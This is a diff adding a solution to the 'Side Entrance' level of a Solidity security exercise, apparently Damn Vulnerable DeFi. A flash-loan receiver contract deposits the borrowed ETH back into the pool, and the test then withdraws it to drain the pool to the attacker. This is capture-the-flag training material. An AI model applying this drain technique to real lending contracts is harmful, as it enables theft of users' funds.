@@ -11,6 +11,7 @@ contract SideEntrance is Test {
 
     Utilities internal utils;
     SideEntranceLenderPool internal sideEntranceLenderPool;
+    Attacker_FlashLoanReceiver public attacker_sc;
     address payable internal attacker;
     uint256 public attackerInitialEthBalance;
 
@@ -34,7 +35,15 @@ contract SideEntrance is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        attacker_sc = new Attacker_FlashLoanReceiver(
+            address(sideEntranceLenderPool)
+        );
+        vm.label(address(attacker_sc), "attacker_sc");
+        vm.startPrank(address(attacker_sc));
+        sideEntranceLenderPool.flashLoan(1000 ether);
+        sideEntranceLenderPool.withdraw();
+        attacker.transfer(1000 ether);
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
@@ -43,4 +52,20 @@ contract SideEntrance is Test {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
+}
+
+contract Attacker_FlashLoanReceiver {
+    SideEntranceLenderPool internal sideEntranceLenderPool;
+
+    constructor(address _sideEntranceLenderPool) {
+        sideEntranceLenderPool = SideEntranceLenderPool(
+            _sideEntranceLenderPool
+        );
+    }
+
+    function execute() external payable {
+        sideEntranceLenderPool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
 }
